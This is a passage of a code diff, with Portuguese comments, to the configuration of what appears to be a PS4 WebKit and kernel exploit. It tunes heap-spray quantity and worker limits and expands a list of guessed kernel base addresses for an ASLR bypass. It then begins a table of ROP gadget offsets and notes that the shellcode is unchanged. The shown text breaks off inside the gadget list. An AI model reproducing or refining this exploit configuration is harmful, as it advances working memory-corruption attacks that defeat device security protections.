@@ -1,19 +1,24 @@
+// CONFIGURAÇÃO LIMPA (SEM BASE ÚNICA)
 export const CONFIG = {
-    WORKER_LIMIT: 403,
-    SPRAY_QUANTITY: 20000, // Spray massivo para cobrir endereços
+    // Limite Crítico (Descoberto no seu teste)
+    WORKER_LIMIT: 406,
     
-    // Bases prováveis do WebKit (Estatística)
-    // O script vai tentar criar um objeto que funcione para QUALQUER uma dessas
+    // Quantidade massiva para cobrir a memória
+    SPRAY_QUANTITY: 25000,
+
+    // BASES PROVÁVEIS (ASLR Bypass via Estatística)
+    // O Kernel do PS4 tende a carregar em endereços alinhados a 0x4000 ou 0x10000.
+    // Vamos testar os "hotspots" mais comuns.
     TARGET_BASES: [
-        0x800000000n, 
-        0x801000000n,
-        0x808000000n,
-        0x820000000n, // O seu "Golden"
-        0x83e000000n,
-        0x900000000n
+        0x800000000n, 0x800004000n, 0x800010000n, // Baixos
+        0x800400000n, 0x800800000n, 0x801000000n,
+        0x820000000n, 0x820004000n, 0x820010000n, // Médios (Seu Golden!)
+        0x880000000n, 0x880004000n, 0x880010000n,
+        0x900000000n, 0x920000000n, 0x940000000n, // Altos
+        0x200000000n  // Mapping alternativo
     ]
 };
-// Mantenha os GADGETS e SHELLCODE iguais...
+//Mantenha os GADGETS e SHELLCODE iguais...
 export const GADGETS = {
     pop_rdi: 0x2FEB5n,
     pop_rsi: 0x2B89Fn,
